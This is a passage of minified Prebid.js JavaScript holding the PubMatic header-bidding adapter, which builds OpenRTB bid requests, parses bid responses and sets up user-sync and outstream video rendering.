        var a = Object.getOwnPropertySymbols(e);
        r && (a = a.filter(function (r) {
          return Object.getOwnPropertyDescriptor(e, r).enumerable;
        })), t.push.apply(t, a);
      }
      return t;
    }
    function p(e, r, t) {
      return r in e ? Object.defineProperty(e, r, {
        value: t,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[r] = t, e;
    }
    function u(e) {
      return (u = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    var l = "pubmatic",
      m = "PubMatic: ",
      b = "USD",
      g = void 0,
      f = "https://pubmatic.bbvms.com/r/".concat("$RENDERER", ".js"),
      h = {
        kadpageurl: "",
        gender: "",
        yob: "",
        lat: "",
        lon: "",
        wiid: "",
        profId: "",
        verId: ""
      },
      y = "number",
      v = "string",
      O = "boolean",
      E = "array",
      I = {
        mimes: E,
        minduration: y,
        maxduration: y,
        startdelay: y,
        playbackmethod: E,
        api: E,
        protocols: E,
        w: y,
        h: y,
        battr: E,
        linearity: y,
        placement: y,
        minbitrate: y,
        maxbitrate: y,
        skip: y
      },
      w = {
        TITLE: {
          ID: 1,
          KEY: "title",
          TYPE: 0
        },
        IMAGE: {
          ID: 2,
          KEY: "image",
          TYPE: 0
        },
        ICON: {
          ID: 3,
          KEY: "icon",
          TYPE: 0
        },
        SPONSOREDBY: {
          ID: 4,
          KEY: "sponsoredBy",
          TYPE: 1
        },
        BODY: {
          ID: 5,
          KEY: "body",
          TYPE: 2
        },
        CLICKURL: {
          ID: 6,
          KEY: "clickUrl",
          TYPE: 0
        },
        VIDEO: {
          ID: 7,
          KEY: "video",
          TYPE: 0
        },
        EXT: {
          ID: 8,
          KEY: "ext",
          TYPE: 0
        },
        DATA: {
          ID: 9,
          KEY: "data",
          TYPE: 0
        },
        LOGO: {
          ID: 10,
          KEY: "logo",
          TYPE: 0
        },
        SPONSORED: {
          ID: 11,
          KEY: "sponsored",
          TYPE: 1
        },
        DESC: {
          ID: 12,
          KEY: "data",
          TYPE: 2
        },
        RATING: {
          ID: 13,
          KEY: "rating",
          TYPE: 3
        },
        LIKES: {
          ID: 14,
          KEY: "likes",
          TYPE: 4
        },
        DOWNLOADS: {
          ID: 15,
          KEY: "downloads",
          TYPE: 5
        },
        PRICE: {
          ID: 16,
          KEY: "price",
          TYPE: 6
        },
        SALEPRICE: {
          ID: 17,
          KEY: "saleprice",
          TYPE: 7
        },
        PHONE: {
          ID: 18,
          KEY: "phone",
          TYPE: 8
        },
        ADDRESS: {
          ID: 19,
          KEY: "address",
          TYPE: 9
        },
        DESC2: {
          ID: 20,
          KEY: "desc2",
          TYPE: 10
        },
        DISPLAYURL: {
          ID: 21,
          KEY: "displayurl",
          TYPE: 11
        },
        CTA: {
          ID: 22,
          KEY: "cta",
          TYPE: 12
        }
      },
      j = 1,
      P = 2,
      T = 3,
      S = [{
        id: w.SPONSOREDBY.ID,
        required: !0,
        data: {
          type: 1
        }
      }, {
        id: w.TITLE.ID,
        required: !0
      }, {
        id: w.IMAGE.ID,
        required: !0
      }],
      D = {
        1: "PMP",
        5: "PREF",
        6: "PMPG"
      },
      x = 1,
      Y = 2,
      k = {
        bootstrapPlayer: function (e) {
          var r = {
            code: e.adUnitCode
          };
          if (e.vastXml ? r.vastXml = e.vastXml : e.vastUrl && (r.vastUrl = e.vastUrl), e.vastXml || e.vastUrl) {
            for (var t, i = k.getRendererId("pubmatic", e.rendererCode), n = document.getElementById(e.adUnitCode), s = 0; s < window.bluebillywig.renderers.length; s++) if (window.bluebillywig.renderers[s]._id === i) {
              t = window.bluebillywig.renderers[s];
              break;
            }
            t ? t.bootstrap(r, n) : Object(a.logWarn)("".concat(m, ": Couldn't find a renderer with ").concat(i));
          } else Object(a.logWarn)("".concat(m, ": No vastXml or vastUrl on bid, bailing..."));
        },
        newRenderer: function (e, r) {
          var t = f.replace("$RENDERER", e),
            i = o.a.install({
              url: t,
              loaded: !1,
              adUnitCode: r
            });
          try {
            i.setRender(k.outstreamRender);
          } catch (e) {
            Object(a.logWarn)("".concat(m, ": Error tying to setRender on renderer"), e);
          }
          return i;
        },
        outstreamRender: function (e) {
          e.renderer.push(function () {
            k.bootstrapPlayer(e);
          });
        },
        getRendererId: function (e, r) {
          return "".concat(e, "-").concat(r);
        }
      },
      R = [n.b, n.d, n.c],
      A = 0,
      C = !1,
      z = {},
      K = {};
    function N(e, r) {
      if (!Object(a.isStr)(r)) return r && Object(a.logWarn)("PubMatic: Ignoring param key: " + e + ", expects string-value, found " + u(r)), g;
      switch (e) {
        case "pmzoneid":
          return r.split(",").slice(0, 50).map(function (e) {
            return e.trim();
          }).join();
        case "kadfloor":
        case "lat":
        case "lon":
          return parseFloat(r) || g;
        case "yob":
          return parseInt(r) || g;
        default:
          return r;
      }
    }
    function M(e) {
      var r;
      e.params.adUnit = "", e.params.adUnitIndex = "0", e.params.width = 0, e.params.height = 0, e.params.adSlot = (r = e.params.adSlot, Object(a.isStr)(r) ? r.replace(/^\s+/g, "").replace(/\s+$/g, "") : (r && Object(a.logWarn)("pubmatic: adSlot must be a string. Ignoring adSlot"), ""));
      var t = e.params.adSlot,
        i = t.split(":");
      if (t = i[0], 2 == i.length && (e.params.adUnitIndex = i[1]), i = t.split("@"), e.params.adUnit = i[0], i.length > 1) {
        if (2 != (i = i[1].split("x")).length) return void Object(a.logWarn)("PubMatic: AdSlot Error: adSlot not in required format");
        e.params.width = parseInt(i[0], 10), e.params.height = parseInt(i[1], 10);
      } else if (e.hasOwnProperty("mediaTypes") && e.mediaTypes.hasOwnProperty(n.b) && e.mediaTypes.banner.hasOwnProperty("sizes")) {
        for (var s = 0, o = []; s < e.mediaTypes.banner.sizes.length; s++) 2 === e.mediaTypes.banner.sizes[s].length && o.push(e.mediaTypes.banner.sizes[s]);
        e.mediaTypes.banner.sizes = o, e.mediaTypes.banner.sizes.length >= 1 && (e.params.width = e.mediaTypes.banner.sizes[0][0], e.params.height = e.mediaTypes.banner.sizes[0][1], e.mediaTypes.banner.sizes = e.mediaTypes.banner.sizes.splice(1, e.mediaTypes.banner.sizes.length - 1));
      }
    }
    function U(e, r, t) {
      var i,
        n = "Ignoring param key: " + e + ", expects " + t + ", found " + u(r);
      switch (t) {
        case O:
          i = a.isBoolean;
          break;
        case y:
          i = a.isNumber;
          break;
        case v:
          i = a.isStr;
          break;
        case E:
          i = a.isArray;
      }
      return i(r) ? r : (Object(a.logWarn)(m + n), g);
    }
    function q(e, r) {
      var t = e.KEY;
      return {
        id: e.ID,
        required: r[t].required ? 1 : 0,
        data: {
          type: e.TYPE,
          len: r[t].len,
          ext: r[t].ext
        }
      };
    }
    function L(e) {
      var r = {
        assets: []
      };
      for (var t in e) {
        if (e.hasOwnProperty(t)) {
          var i = {};
          if (!(r.assets && r.assets.length > 0 && r.assets.hasOwnProperty(t))) switch (t) {
            case w.TITLE.KEY:
              e[t].len || e[t].length ? i = {
                id: w.TITLE.ID,
                required: e[t].required ? 1 : 0,
                title: {
                  len: e[t].len || e[t].length,
                  ext: e[t].ext
                }
              } : Object(a.logWarn)("PubMatic: Error: Title Length is required for native ad: " + JSON.stringify(e));
              break;
            case w.IMAGE.KEY:
              e[t].sizes && e[t].sizes.length > 0 ? i = {
                id: w.IMAGE.ID,
                required: e[t].required ? 1 : 0,
                img: {
                  type: T,
                  w: e[t].w || e[t].width || (e[t].sizes ? e[t].sizes[0] : g),
                  h: e[t].h || e[t].height || (e[t].sizes ? e[t].sizes[1] : g),
                  wmin: e[t].wmin || e[t].minimumWidth || (e[t].minsizes ? e[t].minsizes[0] : g),
                  hmin: e[t].hmin || e[t].minimumHeight || (e[t].minsizes ? e[t].minsizes[1] : g),
                  mimes: e[t].mimes,
                  ext: e[t].ext
                }
              } : Object(a.logWarn)("PubMatic: Error: Image sizes is required for native ad: " + JSON.stringify(e));
              break;
            case w.ICON.KEY:
              e[t].sizes && e[t].sizes.length > 0 ? i = {
                id: w.ICON.ID,
                required: e[t].required ? 1 : 0,
                img: {
                  type: j,
                  w: e[t].w || e[t].width || (e[t].sizes ? e[t].sizes[0] : g),
                  h: e[t].h || e[t].height || (e[t].sizes ? e[t].sizes[1] : g)
                }
              } : Object(a.logWarn)("PubMatic: Error: Icon sizes is required for native ad: " + JSON.stringify(e));
              break;
            case w.VIDEO.KEY:
              i = {
                id: w.VIDEO.ID,
                required: e[t].required ? 1 : 0,
                video: {
                  minduration: e[t].minduration,
                  maxduration: e[t].maxduration,
                  protocols: e[t].protocols,
                  mimes: e[t].mimes,
                  ext: e[t].ext
                }
              };
              break;
            case w.EXT.KEY:
              i = {
                id: w.EXT.ID,
                required: e[t].required ? 1 : 0
              };
              break;
            case w.LOGO.KEY:
              i = {
                id: w.LOGO.ID,
                required: e[t].required ? 1 : 0,
                img: {
                  type: P,
                  w: e[t].w || e[t].width || (e[t].sizes ? e[t].sizes[0] : g),
                  h: e[t].h || e[t].height || (e[t].sizes ? e[t].sizes[1] : g)
                }
              };
              break;
            case w.SPONSOREDBY.KEY:
            case w.BODY.KEY:
            case w.RATING.KEY:
            case w.LIKES.KEY:
            case w.DOWNLOADS.KEY:
            case w.PRICE.KEY:
            case w.SALEPRICE.KEY:
            case w.PHONE.KEY:
            case w.ADDRESS.KEY:
            case w.DESC2.KEY:
            case w.DISPLAYURL.KEY:
            case w.CTA.KEY:
              i = q(K[t], e);
          }
        }
        i && i.id && (r.assets[r.assets.length] = i);
      }
      var n = S.length,
        s = 0;
      return S.forEach(function (e) {
        for (var t = r.assets.length, a = 0; a < t; a++) if (e.id == r.assets[a].id) {
          s++;
          break;
        }
      }), C = n != s, r;
    }
    function W(e) {
      var r,
        t = e.mediaTypes.banner.sizes,
        i = [];
      if (t !== g && Object(a.isArray)(t)) {
        if (r = {}, e.params.width || e.params.height) r.w = e.params.width, r.h = e.params.height;else {
          if (0 === t.length) return r = g, Object(a.logWarn)("PubMatic: Error: mediaTypes.banner.size missing for adunit: " + e.params.adUnit + ". Ignoring the banner impression in the adunit."), r;
          r.w = parseInt(t[0][0], 10), r.h = parseInt(t[0][1], 10), t = t.splice(1, t.length - 1);
        }
        t.length > 0 && (i = [], t.forEach(function (e) {
          e.length > 1 && i.push({
            w: e[0],
            h: e[1]
          });
        }), i.length > 0 && (r.format = i)), r.pos = 0, r.topframe = Object(a.inIframe)() ? 0 : 1;
      } else Object(a.logWarn)("PubMatic: Error: mediaTypes.banner.size missing for adunit: " + e.params.adUnit + ". Ignoring the banner impression in the adunit."), r = g;
      return r;
    }
    function _(e, r) {
      Object(a.deepAccess)(e, "placement") || Object(a.logWarn)("Video.Placement param missing for " + r);
    }
    function V(e) {
      var r,
        t = Object(a.mergeDeep)(Object(a.deepAccess)(e.mediaTypes, "video"), e.params.video);
      if (t !== g) {
        for (var i in r = {}, _(t, e.adUnitCode), I) t.hasOwnProperty(i) && (r[i] = U(i, t[i], I[i]));
        Object(a.isArray)(e.mediaTypes.video.playerSize[0]) ? (r.w = parseInt(e.mediaTypes.video.playerSize[0][0], 10), r.h = parseInt(e.mediaTypes.video.playerSize[0][1], 10)) : Object(a.isNumber)(e.mediaTypes.video.playerSize[0]) && (r.w = parseInt(e.mediaTypes.video.playerSize[0], 10), r.h = parseInt(e.mediaTypes.video.playerSize[1], 10));
      } else r = g, Object(a.logWarn)("PubMatic: Error: Video config params missing for adunit: " + e.params.adUnit + " with mediaType set as video. Ignoring video impression in the adunit.");
      return r;
    }
    function B(e, r, t) {
      var a = r.rtd && r.rtd.jwplayer && r.rtd.jwplayer.targeting || void 0,
        i = "";
      if (void 0 !== a && "" !== a && a.hasOwnProperty("segments")) {
        var n,
          s = a.segments.length;
        i += "jw-id=" + a.content.id;
        for (var o = 0; o < s; o++) i += "|jw-" + a.segments[o] + "=1";
        t ? void 0 === e.dctr || 0 == e.dctr.length ? e.dctr = i : e.dctr += "|" + i : (n = e.ext) && void 0 === n.key_val ? n.key_val = i : n.key_val += "|" + i;
      }
    }
    function G(e, r) {
      var t,
        i,
        o = {},
        d = {},
        l = e.hasOwnProperty("sizes") ? e.sizes : [],
        f = "",
        h = [];
      if (function (e, r) {
        r.params.deals && (Object(a.isArray)(r.params.deals) ? r.params.deals.forEach(function (r) {
          Object(a.isStr)(r) && r.length > 3 ? (e.pmp || (e.pmp = {
            private_auction: 0,
            deals: []
          }), e.pmp.deals.push({
            id: r
          })) : Object(a.logWarn)("PubMatic: Error: deal-id present in array bid.params.deals should be a strings with more than 3 charaters length, deal-id ignored: " + r);
        }) : Object(a.logWarn)("PubMatic: Error: bid.params.deals should be an array of strings."));
      }(o = {
        id: e.bidId,
        tagid: e.params.adUnit || void 0,
        bidfloor: N("kadfloor", e.params.kadfloor),
        secure: 1,
        ext: {
          pmZoneId: N("pmzoneid", e.params.pmzoneid)
        },
        bidfloorcur: e.params.currency ? N("currency", e.params.currency) : b
      }, e), function (e, r) {
        var t,
          i = "";
        if (r.params.dctr) if (i = r.params.dctr, Object(a.isStr)(i) && i.length > 0) {
          var n = i.split("|");
          i = "", n.forEach(function (e) {
            i += e.length > 0 ? e.trim() + "|" : "";
          }), t = i.length, "|" === i.substring(t, t - 1) && (i = i.substring(0, t - 1)), e.ext.key_val = i.trim();
        } else Object(a.logWarn)("PubMatic: Ignoring param : dctr with value : " + i + ", expects string-value, found empty or non-string value");
      }(o, e), B(o, e), e.hasOwnProperty("mediaTypes")) for (f in e.mediaTypes) switch (f) {
        case n.b:
          (t = W(e)) !== g && (o.banner = t);
          break;
        case n.c:
          d.request = JSON.stringify(L(e.nativeParams)), C ? Object(a.logWarn)("PubMatic: Error: Error in Native adunit " + e.params.adUnit + ". Ignoring the adunit. Refer to http://prebid.org/dev-docs/show-native-ads.html for more details.") : o.native = d;
          break;
        case n.d:
          (i = V(e)) !== g && (o.video = i);
      } else t = {
        pos: 0,
        w: e.params.width,
        h: e.params.height,
        topframe: Object(a.inIframe)() ? 0 : 1
      }, Object(a.isArray)(l) && l.length > 1 && ((l = l.splice(1, l.length - 1)).forEach(function (e) {
        h.push({
          w: e[0],
          h: e[1]
        });
      }), t.format = h), o.banner = t;
      return function (e, r) {
        var t = function (e) {
          for (var r = 1; r < arguments.length; r++) {
            var t = null != arguments[r] ? arguments[r] : {};
            r % 2 ? c(Object(t), !0).forEach(function (r) {
              p(e, r, t[r]);
            }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : c(Object(t)).forEach(function (r) {
              Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r));
            });
          }
          return e;
        }({}, Object(a.deepAccess)(r, "ortb2Imp.ext.data"));
        Object.keys(t).forEach(function (r) {
          "pbadslot" === r ? "string" == typeof t[r] && t[r] && Object(a.deepSetValue)(e, "ext.data.pbadslot", t[r]) : "adserver" === r ? ["name", "adslot"].forEach(function (r) {
            var i = Object(a.deepAccess)(t, "adserver.".concat(r));
            "string" == typeof i && i && (Object(a.deepSetValue)(e, "ext.data.adserver.".concat(r.toLowerCase()), i), "adslot" === r && Object(a.deepSetValue)(e, "ext.dfp_ad_unit_code", i));
          }) : Object(a.deepSetValue)(e, "ext.data.".concat(r), t[r]);
        });
      }(o, e), function (e, r) {
        var t = -1;
        "function" != typeof r.getFloor || s.b.getConfig("pubmatic.disableFloors") || [n.b, n.d, n.c].forEach(function (i) {
          if (e.hasOwnProperty(i)) {
            var n = [];
            "banner" === i && (e[i].w && e[i].h && n.push([e[i].w, e[i].h]), Object(a.isArray)(e[i].format) && e[i].format.forEach(function (e) {
              return n.push([e.w, e.h]);
            })), 0 === n.length && n.push("*"), n.forEach(function (n) {
              var s = r.getFloor({
                currency: e.bidfloorcur,
                mediaType: i,
                size: n
              });
              if (Object(a.logInfo)(m, "floor from floor module returned for mediatype:", i, " and size:", n, " is: currency", s.currency, "floor", s.floor), "object" === u(s) && s.currency === e.bidfloorcur && !isNaN(parseInt(s.floor))) {
                var o = parseFloat(s.floor);
                Object(a.logInfo)(m, "floor from floor module:", o, "previous floor value", t, "Min:", Math.min(o, t)), t = -1 === t ? o : Math.min(o, t), Object(a.logInfo)(m, "new floor value:", t);
              }
            });
          }
        });
        e.bidfloor && (Object(a.logInfo)(m, "floor from floor module:", t, "impObj.bidfloor", e.bidfloor, "Max:", Math.max(t, e.bidfloor)), t = Math.max(t, e.bidfloor));
        e.bidfloor = !isNaN(t) && t > 0 ? t : g, Object(a.logInfo)(m, "new impObj.bidfloor value:", e.bidfloor);
      }(o, e), o.hasOwnProperty(n.b) || o.hasOwnProperty(n.c) || o.hasOwnProperty(n.d) ? o : g;
    }
    function F(e, r) {
      var t = null,
        i = Object(a.deepAccess)(e, "0.userId.flocId");
      if (i && i.id) switch (r) {
        case Y:
          t = {
            id: "FLOC",
            name: "FLOC",
            ext: {
              ver: i.version
            },
            segment: [{
              id: i.id,
              name: "chrome.com",
              value: i.id.toString()
            }]
          };
          break;
        case x:
        default:
          t = {
            source: "chrome.com",
            uids: [{
              atype: 1,
              id: i.id,
              ext: {
                ver: i.version
              }
            }]
          };
      }
      return t;
    }
    function J(e) {
      return !0 === Object(a.isArray)(e) && e.length > 0;
    }
    Object(a._each)(w, function (e) {
      z[e.ID] = e.KEY;
    }), Object(a._each)(w, function (e) {
      K[e.KEY] = e;
    });
    var X = {
      code: l,
      gvlid: 76,
      supportedMediaTypes: [n.b, n.d, n.c],
      aliases: [{
        code: "groupm",
        gvlid: 98
      }],
      isBidRequestValid: function (e) {
        if (e && e.params) {
          if (!Object(a.isStr)(e.params.publisherId)) return Object(a.logWarn)("PubMatic: Error: publisherId is mandatory and cannot be numeric (wrap it in quotes in your config). Call to OpenBid will not be sent for ad unit: " + JSON.stringify(e)), !1;
          if (e.hasOwnProperty("mediaTypes") && e.mediaTypes.hasOwnProperty(n.d)) {
            var r = Object(a.deepAccess)(e.mediaTypes, "video.mimes"),
              t = Object(a.deepAccess)(e, "params.video.mimes");
            if (!1 === J(r) && !1 === J(t)) return Object(a.logWarn)("PubMatic: Error: For video ads, bid.mediaTypes.video.mimes OR bid.params.video.mimes should be present and must be a non-empty array. Call to OpenBid will not be sent for ad unit:" + JSON.stringify(e)), !1;
            if (!e.mediaTypes[n.d].hasOwnProperty("context")) return Object(a.logError)("".concat(m, ": no context specified in bid. Rejecting bid: "), e), !1;
            if ("outstream" === e.mediaTypes[n.d].context && !Object(a.isStr)(e.params.outstreamAU) && !e.hasOwnProperty("renderer") && !e.mediaTypes[n.d].hasOwnProperty("renderer")) return e.mediaTypes.hasOwnProperty(n.b) || e.mediaTypes.hasOwnProperty(n.c) ? (delete e.mediaTypes[n.d], Object(a.logWarn)("".concat(m, ': for "outstream" bids either outstreamAU parameter must be provided or ad unit supplied renderer is required. Rejecting mediatype Video of bid: '), e), !0) : (Object(a.logError)("".concat(m, ': for "outstream" bids either outstreamAU parameter must be provided or ad unit supplied renderer is required. Rejecting bid: '), e), !1);
          }
          return !0;
        }
        return !1;
      },
      buildRequests: function (e, r) {
        var t;
        r && r.refererInfo && (t = r.refererInfo);
        var i,
          o = function (e) {
            return {
              pageURL: e && e.referer ? e.referer : window.location.href,
              refURL: window.document.referrer
            };
          }(t),
          c = function (e) {
            return {
              id: "" + new Date().getTime(),
              at: 1,
              cur: [b],
              imp: [],
              site: {
                page: e.pageURL,
                ref: e.refURL,
                publisher: {}
              },
              device: {
                ua: navigator.userAgent,
                js: 1,
                dnt: "yes" == navigator.doNotTrack || "1" == navigator.doNotTrack || "1" == navigator.msDoNotTrack ? 1 : 0,
                h: screen.height,
                w: screen.width,
                language: navigator.language
              },
              user: {},
              ext: {}
            };
          }(o),
          p = "",
          l = [],
          m = [];
        if (e.forEach(function (e) {
          if ((i = Object(a.deepClone)(e)).params.adSlot = i.params.adSlot || "", M(i), i.mediaTypes && i.mediaTypes.hasOwnProperty("video") || i.params.hasOwnProperty("video")) ;else if (!(i.hasOwnProperty("mediaTypes") && i.mediaTypes.hasOwnProperty(n.c) || 0 !== i.params.width || 0 !== i.params.height)) return void Object(a.logWarn)("PubMatic: Skipping the non-standard adslot: ", i.params.adSlot, JSON.stringify(i));
          o.pubId = o.pubId || i.params.publisherId, (o = function (e, r) {
            var t, i, n;
            for (t in r.kadpageurl || (r.kadpageurl = r.pageURL), h) h.hasOwnProperty(t) && (i = e[t]) && ("object" === u(n = h[t]) && (i = n.f(i, r)), Object(a.isStr)(i) ? r[t] = i : Object(a.logWarn)("PubMatic: Ignoring param : " + t + " with value : " + h[t] + ", expects string-value, found " + u(i)));
            return r;
          }(i.params, o)).transactionId = i.transactionId, "" === p ? p = i.params.currency || g : i.params.hasOwnProperty("currency") && p !== i.params.currency && Object(a.logWarn)("PubMatic: Currency specifier ignored. Only one currency permitted."), i.params.currency = p, i.params.hasOwnProperty("dctr") && Object(a.isStr)(i.params.dctr) && l.push(i.params.dctr), i.params.hasOwnProperty("bcat") && Object(a.isArray)(i.params.bcat) && (m = m.concat(i.params.bcat));
          var r = G(i);
          r && c.imp.push(r);
        }), 0 != c.imp.length) {
          var f, y;
          c.site.publisher.id = o.pubId.trim(), A = o.pubId.trim(), c.ext.wrapper = {}, c.ext.wrapper.profile = parseInt(o.profId) || g, c.ext.wrapper.version = parseInt(o.verId) || g, c.ext.wrapper.wiid = o.wiid || r.auctionId, c.ext.wrapper.wv = "prebid_prebid_6.10.0-pre", c.ext.wrapper.transactionId = o.transactionId, c.ext.wrapper.wp = "pbjs", c.user.gender = o.gender ? o.gender.trim() : g, c.user.geo = {}, c.user.geo.lat = N("lat", o.lat), c.user.geo.lon = N("lon", o.lon), c.user.yob = N("yob", o.yob), c.device.geo = c.user.geo, c.site.page = o.kadpageurl.trim() || c.site.page.trim(), c.site.domain = (f = c.site.page, (y = document.createElement("a")).href = f, y.hostname), "object" === u(s.b.getConfig("content")) && (c.site.content = s.b.getConfig("content")), "object" === u(s.b.getConfig("device")) && (c.device = d(c.device, s.b.getConfig("device"))), Object(a.deepSetValue)(c, "source.tid", o.transactionId), -1 !== window.location.href.indexOf("pubmaticTest=true") && (c.test = 1), e[0].schain && Object(a.deepSetValue)(c, "source.ext.schain", e[0].schain), r && r.gdprConsent && (Object(a.deepSetValue)(c, "user.ext.consent", r.gdprConsent.consentString), Object(a.deepSetValue)(c, "regs.ext.gdpr", r.gdprConsent.gdprApplies ? 1 : 0)), r && r.uspConsent && Object(a.deepSetValue)(c, "regs.ext.us_privacy", r.uspConsent), !0 === s.b.getConfig("coppa") && Object(a.deepSetValue)(c, "regs.coppa", 1), function (e, r) {
            var t = Object(a.deepAccess)(r, "0.userIdAsEids"),
              i = F(r, x);
            i && (t || (t = []), t.push(i)), Object(a.isArray)(t) && t.length > 0 && Object(a.deepSetValue)(e, "user.eids", t);
          }(c, e), function (e, r) {
            (r = r.filter(function (e) {
              return "string" == typeof e || (Object(a.logWarn)("PubMatic: bcat: Each category should be a string, ignoring category: " + e), !1);
            }).map(function (e) {
              return e.trim();
            }).filter(function (e, r, t) {
              if (e.length > 3) return t.indexOf(e) === r;
              Object(a.logWarn)("PubMatic: bcat: Each category should have a value of a length of more than 3 characters, ignoring category: " + e);
            })).length > 0 && (Object(a.logWarn)("PubMatic: bcat: Selected: ", r), e.bcat = r);
          }(c, m), function (e, r) {
            var t = F(r, Y);
            t && (e.user || (e.user = {}), e.user.data || (e.user.data = []), e.user.data.push(t));
          }(c, e);
          var v = s.b.getConfig("ortb2") || {};
          return v.site && Object(a.mergeDeep)(c, {
            site: v.site
          }), v.user && Object(a.mergeDeep)(c, {
            user: v.user
          }), "object" === u(s.b.getConfig("app")) && (c.app = s.b.getConfig("app"), c.app.publisher = c.site.publisher, c.app.ext = c.site.ext || g, "object" !== u(c.app.content) && (c.app.content = c.site.content || g), delete c.site), {
            method: "POST",
            url: "https://hbopenbid.pubmatic.com/translator?source=prebid-client",
            data: JSON.stringify(c),
            bidderRequest: r
          };
        }
      },
      interpretResponse: function (e, r) {
        var t = [],
          i = b,
          s = JSON.parse(r.data),
          o = s.site && s.site.ref ? s.site.ref : "";
        try {
          e.body && e.body.seatbid && Object(a.isArray)(e.body.seatbid) && (i = e.body.cur || i, e.body.seatbid.forEach(function (e) {
            e.bid && Object(a.isArray)(e.bid) && e.bid.forEach(function (d) {
              var c = {
                requestId: d.impid,
                cpm: (parseFloat(d.price) || 0).toFixed(2),
                width: d.w,
                height: d.h,
                creativeId: d.crid || d.id,
                dealId: d.dealid,
                currency: i,
                netRevenue: true,
                ttl: 300,
                referrer: o,
                ad: d.adm,
                pm_seat: e.seat || null,
                pm_dspid: d.ext && d.ext.dspid ? d.ext.dspid : null,
                partnerImpId: d.id || ""
              };
              s.imp && s.imp.length > 0 && s.imp.forEach(function (e) {
                if (d.impid === e.id) switch (function (e, r) {
                  if (e.ext && null != e.ext.bidtype) r.mediaType = R[e.ext.bidtype];else {
                    Object(a.logInfo)("PubMatic: bid.ext.bidtype does not exist, checking alternatively for mediaType");
                    var t = e.adm,
                      i = "",
                      s = new RegExp(/VAST\s+version/);
                    if (t.indexOf('span class="PubAPIAd"') >= 0) r.mediaType = n.b;else if (s.test(t)) r.mediaType = n.d;else try {
                      (i = JSON.parse(t.replace(/\\/g, ""))) && i.native && (r.mediaType = n.c);
                    } catch (e) {
                      Object(a.logWarn)("PubMatic: Error: Cannot parse native reponse for ad response: " + t);
                    }
                  }
                }(d, c), c.mediaType) {
                  case n.b:
                    break;
                  case n.d:
                    c.width = d.hasOwnProperty("w") ? d.w : e.video.w, c.height = d.hasOwnProperty("h") ? d.h : e.video.h, c.vastXml = d.adm, function (e, r) {
                      var t, a, i;
                      if (r.bidderRequest && r.bidderRequest.bids) {
                        for (var s = 0; s < r.bidderRequest.bids.length; s++) r.bidderRequest.bids[s].bidId === e.requestId && (t = r.bidderRequest.bids[s].params, a = r.bidderRequest.bids[s].mediaTypes[n.d].context, i = r.bidderRequest.bids[s].adUnitCode);
                        a && "outstream" === a && t && t.outstreamAU && i && (e.rendererCode = t.outstreamAU, e.renderer = k.newRenderer(e.rendererCode, i));
                      }
                    }(c, r);
                    break;
                  case n.c:
                    !function (e, r) {
                      if (r.native = {}, e.hasOwnProperty("adm")) {
                        var t = "";
                        try {
                          t = JSON.parse(e.adm.replace(/\\/g, ""));
                        } catch (e) {
                          return void Object(a.logWarn)("PubMatic: Error: Cannot parse native reponse for ad response: " + r.adm);
                        }
                        if (t && t.native && t.native.assets && t.native.assets.length > 0) {
                          r.mediaType = n.c;
                          for (var i = 0, s = t.native.assets.length; i < s; i++) switch (t.native.assets[i].id) {
                            case w.TITLE.ID:
                              r.native.title = t.native.assets[i].title && t.native.assets[i].title.text;
                              break;
                            case w.IMAGE.ID:
                              r.native.image = {
                                url: t.native.assets[i].img && t.native.assets[i].img.url,
                                height: t.native.assets[i].img && t.native.assets[i].img.h,
                                width: t.native.assets[i].img && t.native.assets[i].img.w
                              };
                              break;
                            case w.ICON.ID:
                              r.native.icon = {
                                url: t.native.assets[i].img && t.native.assets[i].img.url,
                                height: t.native.assets[i].img && t.native.assets[i].img.h,
                                width: t.native.assets[i].img && t.native.assets[i].img.w
                              };
                              break;
                            case w.SPONSOREDBY.ID:
                            case w.BODY.ID:
                            case w.LIKES.ID:
                            case w.DOWNLOADS.ID:
                            case w.PRICE:
                            case w.SALEPRICE.ID:
                            case w.PHONE.ID:
                            case w.ADDRESS.ID:
                            case w.DESC2.ID:
                            case w.CTA.ID:
                            case w.RATING.ID:
                            case w.DISPLAYURL.ID:
                              r.native[z[t.native.assets[i].id]] = t.native.assets[i].data && t.native.assets[i].data.value;
                          }
                          r.native.clickUrl = t.native.link && t.native.link.url, r.native.clickTrackers = t.native.link && t.native.link.clicktrackers || [], r.native.impressionTrackers = t.native.imptrackers || [], r.native.jstracker = t.native.jstracker || [], r.width || (r.width = 0), r.height || (r.height = 0);
                        }
                      }
                    }(d, c);
                }
              }), d.ext && d.ext.deal_channel && (c.dealChannel = D[d.ext.deal_channel] || null), c.meta = {}, d.ext && d.ext.dspid && (c.meta.networkId = d.ext.dspid), d.ext && d.ext.advid && (c.meta.buyerId = d.ext.advid), d.adomain && d.adomain.length > 0 && (c.meta.advertiserDomains = d.adomain, c.meta.clickUrl = d.adomain[0]), e.ext && e.ext.buyid && (c.adserverTargeting = {
                hb_buyid_pubmatic: e.ext.buyid
              }), t.push(c);
            });
          }));
        } catch (e) {
          Object(a.logError)(e);
        }
        return t;
      },
      getUserSyncs: function (e, r, t, a) {
        var i = "" + A;
        return t && (i += "&gdpr=" + (t.gdprApplies ? 1 : 0), i += "&gdpr_consent=" + encodeURIComponent(t.consentString || "")), a && (i += "&us_privacy=" + encodeURIComponent(a)), !0 === s.b.getConfig("coppa") && (i += "&coppa=1"), e.iframeEnabled ? [{
          type: "iframe",
          url: "https://ads.pubmatic.com/AdServer/js/user_sync.html?kdntuid=1&p=" + i
        }] : [{
          type: "image",
          url: "https://image8.pubmatic.com/AdServer/ImgSync?p=" + i
        }];
      },
      transformBidParams: function (e, r, t, i) {
        return B(e, t.bids[0], !0), Object(a.convertTypes)({
          publisherId: "string",
          adSlot: "string"
        }, e);
      }
    };
    Object(i.registerBidder)(X), window.pbjs.installedModules.push("pubmaticBidAdapter");
  }
}, [613]);
pbjsChunk([149], {
  675: function (e, t, r) {
    e.exports = r(676);
  },
  676: function (e, t, r) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), r.d(t, "spec", function () {
      return j;
    }), t.hasVideoMediaType = I, r.d(t, "resetRubiConf", function () {
      return k;
